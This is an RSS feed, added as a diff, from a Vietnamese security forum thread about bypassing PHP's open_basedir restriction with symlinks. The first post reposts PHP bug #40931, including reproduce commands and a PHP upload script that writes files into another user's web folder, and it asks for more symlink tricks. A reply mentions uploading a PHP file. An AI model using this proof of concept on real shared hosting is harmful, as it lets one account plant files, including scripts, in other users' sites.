@@ -1,0 +1,99 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "local bypass user via symlink"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "local bypass user via symlink"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>local bypass user via symlink</title>
+				<description><![CDATA[ Mình nhớ là đã post bài này rồi mà tìm lại không thấy.xin được pót lại nếu trùng các mod xóa dùm.
+bài này trên <span class="link"> http://bugs.php.net/bug.php?id=40931</span>
+<blockquote>
+Bug #40931 open_basedir bypass via symlink and move_uploaded_file()
+Description:
+------------
+User can bypass open_basedir restriction by move_uploaded_file() if
+target file path is symlink to any directory.
+
+Reproduce code:
+---------------
+user1 will upload file to user2's /home/user2/public_html folder.
+
+We have in /etc/passwd:
+user1:32001:32001::/home/user1:/bin/bash
+user2:32002:32002::/home/user2:/bin/bash
+
+Target folder allows to write for anybody:
+# ls -lA /home/user2
+drwxrwxrwx 2 user2 user2 4096 Mar 27 17:31 public_html/
+
+Apache have mod_php intalled. Apache config for user1:
+&lt;VirtualHost xxx.xxx.xxx.xxx&gt;
+ServerName user1.xxxxxxx.com
+DocumentRoot /home/user1/public_html
+User user1
+php_admin_value open_basedir "/home/user1"
+&lt;/VirtualHost&gt;
+
+User user1 can do something like:
+
+$ cd /home/user1/public_html/
+$ ln -s /home/user2/public_html user2_public_html
+$ echo '&lt;html&gt;&lt;body&gt;
+
+&lt;?
+if ( isset($_FILES["userfile"]) ) {
+echo "Upload ";
+if (move_uploaded_file
+($_FILES["userfile"]["tmp_name"],"/home/user1/public_html/user2_public_h
+tml/file.ext"))
+echo "ok";
+else echo "failed";
+}
+
+?&gt;
+
+&lt;form name="uplform" method="post" action="&lt;?=$PHP_SELF?&gt;"
+enctype="multipart/form-data"&gt;
+&lt;input type="file" name="userfile"&gt;
+&lt;input type="submit"&gt;
+
+&lt;/body&gt;&lt;/html&gt;' &gt; upload.php
+
+Expected result:
+----------------
+If we access<span class="link"> http://user1.xxxxxxx.com/upload.php</span> after file upload
+expected message
+"Upload failed"
+and no file
+/home/user2/public_html/file.ext
+in target folder.
+
+Actual result:
+--------------
+If we access<span class="link"> http://user1.xxxxxxx.com/upload.php</span> after file upload we
+got message
+"Upload ok"
+and file
+/home/user2/public_html/file.ext
+well exist in target folder. 
+&nbsp;
+		</blockquote>
+Các bác vào thảo luân với.hoặc nếu các bác có kinh nghiệm nào local áp dụng symlink thì vui lòng chia sẻ chút ít.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19563.hva#116495</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/19563.hva#116495</link>
+				<pubDate><![CDATA[Sun, 24 Feb 2008 18:46:09]]> GMT</pubDate>
+				<author><![CDATA[ ly0kha]]></author>
+			</item>
+			<item>
+				<title>Re: local bypass user via symlink</title>
+				<description><![CDATA[ Có khả năng upload mỗi tội khi upload xong the name of file is renamed :D for example , i upload a file with name zatuzik.php , after uploading the name is renamed to 0aef023 .
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/19563.hva#120734</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/19563.hva#120734</link>
+				<pubDate><![CDATA[Sat, 22 Mar 2008 22:03:57]]> GMT</pubDate>
+				<author><![CDATA[ zatuzik]]></author>
+			</item>
+	</channel>
+</rss>
